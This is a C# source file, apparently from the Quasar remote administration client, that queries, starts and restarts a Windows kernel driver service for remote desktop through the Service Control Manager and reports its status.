using Quasar.Client.Logging;
using Quasar.Client.Utilities;
using Quasar.Common.Enums;
using Quasar.Common.Helpers;
using Quasar.Common.Messages;
using System;
using System.ComponentModel;
using System.Diagnostics;
using System.Runtime.InteropServices;
using System.Threading;

namespace Quasar.Client.RemoteDesktop.Driver
{
    internal sealed class KernelDriverManager
    {
        private const string ServiceName = "QuasarRemoteDesktopDrv";
        private const string DefaultDriverVersion = "not-packaged";
        private const int ServicePollIntervalMs = 500;
        private const int ServiceStartTimeoutMs = 15000;
        private const int ServiceStopTimeoutMs = 10000;

        private readonly object _syncRoot = new object();
        private readonly KernelDriverLogger _logger;
        private KernelDriverStatusResponse _status = new KernelDriverStatusResponse
        {
            State = KernelDriverState.Unknown,
            Version = DefaultDriverVersion,
            WatchdogActive = false,
            Message = "Kernel driver pipeline not initialized."
        };

        public KernelDriverManager(KernelDriverLogger logger = null)
        {
            _logger = logger ?? new KernelDriverLogger();
        }

        public KernelDriverState EnsureState(KernelDriverAction action)
        {
            lock (_syncRoot)
            {
                RefreshStatus();

                switch (action)
                {
                    case KernelDriverAction.EnsureRunning:
                        EnsureRunning();
                        break;
                    case KernelDriverAction.Restart:
                        RestartService();
                        break;
                    case KernelDriverAction.Remove:
                        _status = CloneStatus(KernelDriverState.NotInstalled, "Driver removal workflow not implemented yet.");
                        break;
                }

                return _status.State;
            }
        }

        public KernelDriverStatusResponse GetStatus(bool forceRefresh)
        {
            lock (_syncRoot)
            {
                if (forceRefresh)
                    RefreshStatus();

                return CloneStatus(_status);
            }
        }

        private void EnsureRunning()
        {
            if (_status.State == KernelDriverState.NotInstalled)
            {
                _status = CloneStatus(KernelDriverState.NotInstalled, $"Driver service \"{ServiceName}\" is not installed.");
                _logger.Warning($"Kernel driver ensure requested but service \"{ServiceName}\" is missing.");
                return;
            }

            if (_status.State == KernelDriverState.Running)
                return;

            var desiredAccess = NativeMethods.ServiceAccessRights.QueryStatus | NativeMethods.ServiceAccessRights.Start;
            if (!TryOpenService(desiredAccess, out var context, out var error))
            {
                UpdateErrorStatus(error, "start");
                return;
            }

            using (context)
            {
                try
                {
                    if (!NativeMethods.StartService(context.Service, 0, IntPtr.Zero))
                    {
                        int win32 = Marshal.GetLastWin32Error();
                        if (win32 != NativeMethods.ERROR_SERVICE_ALREADY_RUNNING)
                            throw new Win32Exception(win32, "StartService failed.");
                    }

                    bool started = WaitForState(context.Service, NativeMethods.SERVICE_RUNNING, ServiceStartTimeoutMs);
                    _status = CloneStatus(started ? KernelDriverState.Running : KernelDriverState.Installed,
                        started ? "Kernel driver service started." : "Kernel driver service start timed out.");
                    _logger.Info($"Kernel driver start requested. Result: { _status.Message }");
                }
                catch (Win32Exception ex)
                {
                    _status = CloneStatus(KernelDriverState.Failed, $"Failed to start kernel driver: {ex.Message}");
                    _logger.Error($"Kernel driver start failed: {ex.Message}");
                }
            }

            RefreshStatus();
        }

        private void RestartService()
        {
            if (_status.State == KernelDriverState.NotInstalled)
            {
                _status = CloneStatus(KernelDriverState.NotInstalled, $"Driver service \"{ServiceName}\" is not installed.");
                _logger.Warning($"Kernel driver restart requested but service \"{ServiceName}\" is missing.");
                return;
            }

            var desiredAccess = NativeMethods.ServiceAccessRights.QueryStatus |
                                NativeMethods.ServiceAccessRights.Start |
                                NativeMethods.ServiceAccessRights.Stop;
            if (!TryOpenService(desiredAccess, out var context, out var error))
            {
                UpdateErrorStatus(error, "restart");
                return;
            }

            using (context)
            {
                try
                {
                    var serviceStatus = new NativeMethods.SERVICE_STATUS();
                    if (!NativeMethods.ControlService(context.Service, NativeMethods.ServiceControl.Stop, ref serviceStatus))
                    {
                        int win32 = Marshal.GetLastWin32Error();
                        if (win32 != NativeMethods.ERROR_SERVICE_NOT_ACTIVE)
                            throw new Win32Exception(win32, "ControlService failed.");
                    }

                    bool stopped = WaitForState(context.Service, NativeMethods.SERVICE_STOPPED, ServiceStopTimeoutMs);
                    NativeMethods.StartService(context.Service, 0, IntPtr.Zero);
                    bool started = WaitForState(context.Service, NativeMethods.SERVICE_RUNNING, ServiceStartTimeoutMs);
                    var message = !stopped
                        ? "Kernel driver did not report STOPPED state before restart."
                        : "Kernel driver service restarted.";
                    _status = CloneStatus(started ? KernelDriverState.Running : KernelDriverState.Installed, message);
                    _logger.Info($"Kernel driver restart processed. Stopped={stopped}, Started={started}.");
                }
                catch (Win32Exception ex)
                {
                    _status = CloneStatus(KernelDriverState.Failed, $"Failed to restart kernel driver: {ex.Message}");
                    _logger.Error($"Kernel driver restart failed: {ex.Message}");
                }
            }

            RefreshStatus();
        }

        private void RefreshStatus()
        {
            if (!PlatformHelper.Win32NT)
            {
                _status = CloneStatus(KernelDriverState.Failed, "Kernel driver is only supported on Windows hosts.");
                _logger.Warning("Kernel driver operations requested on a non-Windows platform.");
                return;
            }

            if (!TryOpenService(NativeMethods.ServiceAccessRights.QueryStatus, out var context, out var error))
            {
                UpdateErrorStatus(error, "query");
                return;
            }

            using (context)
            {
                try
                {
                    var raw = QueryStatus(context.Service);
                    _status = new KernelDriverStatusResponse
                    {
                        State = MapState(raw.dwCurrentState),
                        Version = _status.Version,
                        WatchdogActive = false,
                        Message = Describe(raw.dwCurrentState)
                    };
                }
                catch (Win32Exception ex)
                {
                    _status = CloneStatus(KernelDriverState.Unknown, $"QueryServiceStatus failed: {ex.Message}");
                    _logger.Error($"Kernel driver status query failed: {ex.Message}");
                }
            }
        }

        private static NativeMethods.SERVICE_STATUS_PROCESS QueryStatus(IntPtr service)
        {
            int size = Marshal.SizeOf(typeof(NativeMethods.SERVICE_STATUS_PROCESS));
            IntPtr buffer = Marshal.AllocHGlobal(size);
            try
            {
                if (!NativeMethods.QueryServiceStatusEx(service, NativeMethods.SC_STATUS_PROCESS_INFO, buffer, (uint)size, out _))
                    throw new Win32Exception(Marshal.GetLastWin32Error());

                return (NativeMethods.SERVICE_STATUS_PROCESS)Marshal.PtrToStructure(buffer, typeof(NativeMethods.SERVICE_STATUS_PROCESS));
            }
            finally
            {
                Marshal.FreeHGlobal(buffer);
            }
        }

        private static KernelDriverState MapState(uint serviceState)
        {
            switch (serviceState)
            {
                case NativeMethods.SERVICE_RUNNING:
                    return KernelDriverState.Running;
                case NativeMethods.SERVICE_START_PENDING:
                case NativeMethods.SERVICE_STOP_PENDING:
                case NativeMethods.SERVICE_STOPPED:
                    return KernelDriverState.Installed;
                case NativeMethods.SERVICE_PAUSED:
                case NativeMethods.SERVICE_PAUSE_PENDING:
                case NativeMethods.SERVICE_CONTINUE_PENDING:
                    return KernelDriverState.Disabled;
                default:
                    return KernelDriverState.Unknown;
            }
        }

        private static string Describe(uint serviceState)
        {
            switch (serviceState)
            {
                case NativeMethods.SERVICE_RUNNING:
                    return "Kernel driver service is running.";
                case NativeMethods.SERVICE_START_PENDING:
                    return "Kernel driver service is starting.";
                case NativeMethods.SERVICE_STOP_PENDING:
                    return "Kernel driver service is stopping.";
                case NativeMethods.SERVICE_STOPPED:
                    return "Kernel driver service is installed but not running.";
                case NativeMethods.SERVICE_PAUSED:
                    return "Kernel driver service is paused.";
                case NativeMethods.SERVICE_PAUSE_PENDING:
                    return "Kernel driver service is pausing.";
                case NativeMethods.SERVICE_CONTINUE_PENDING:
                    return "Kernel driver service is resuming.";
                default:
                    return $"Kernel driver service state: 0x{serviceState:X}.";
            }
        }

        private static bool WaitForState(IntPtr service, uint desiredState, int timeoutMs)
        {
            var sw = Stopwatch.StartNew();
            while (sw.ElapsedMilliseconds < timeoutMs)
            {
                var status = QueryStatus(service);
                if (status.dwCurrentState == desiredState)
                    return true;

                if (status.dwCurrentState == NativeMethods.SERVICE_STOPPED && desiredState != NativeMethods.SERVICE_STOPPED)
                    return false;

                Thread.Sleep(ServicePollIntervalMs);
            }

            return false;
        }

        private bool TryOpenService(NativeMethods.ServiceAccessRights desiredAccess, out ServiceContext context, out int error)
        {
            context = null;
            error = 0;

            var manager = NativeMethods.OpenSCManager(null, null, NativeMethods.ScmAccessRights.Connect);
            if (manager == IntPtr.Zero)
            {
                error = Marshal.GetLastWin32Error();
                return false;
            }

            var service = NativeMethods.OpenService(manager, ServiceName, desiredAccess);
            if (service == IntPtr.Zero)
            {
                error = Marshal.GetLastWin32Error();
                NativeMethods.CloseServiceHandle(manager);
                return false;
            }

            context = new ServiceContext(manager, service);
            return true;
        }

        private void UpdateErrorStatus(int error, string operation)
        {
            if (error == NativeMethods.ERROR_SERVICE_DOES_NOT_EXIST)
            {
                _status = CloneStatus(KernelDriverState.NotInstalled, $"Driver service \"{ServiceName}\" is not installed.");
            }
            else if (error != 0)
            {
                _status = CloneStatus(KernelDriverState.Unknown, $"Unable to {operation} kernel driver (0x{error:X}).");
                _logger.Error($"Kernel driver {operation} failed with Win32 error 0x{error:X}.");
            }
        }

        private KernelDriverStatusResponse CloneStatus(KernelDriverStatusResponse source)
        {
            return new KernelDriverStatusResponse
            {
                State = source.State,
                Version = source.Version,
                WatchdogActive = source.WatchdogActive,
                Message = source.Message
            };
        }

        private KernelDriverStatusResponse CloneStatus(KernelDriverState state, string message, bool watchdog = false)
        {
            return new KernelDriverStatusResponse
            {
                State = state,
                Version = _status.Version,
                WatchdogActive = watchdog,
                Message = message
            };
        }

        private sealed class ServiceContext : IDisposable
        {
            public ServiceContext(IntPtr manager, IntPtr service)
            {
                Manager = manager;
                Service = service;
            }

            public IntPtr Manager { get; }
            public IntPtr Service { get; }

            public void Dispose()
            {
                if (Service != IntPtr.Zero)
                    NativeMethods.CloseServiceHandle(Service);
                if (Manager != IntPtr.Zero)
                    NativeMethods.CloseServiceHandle(Manager);
            }
        }
    }
}
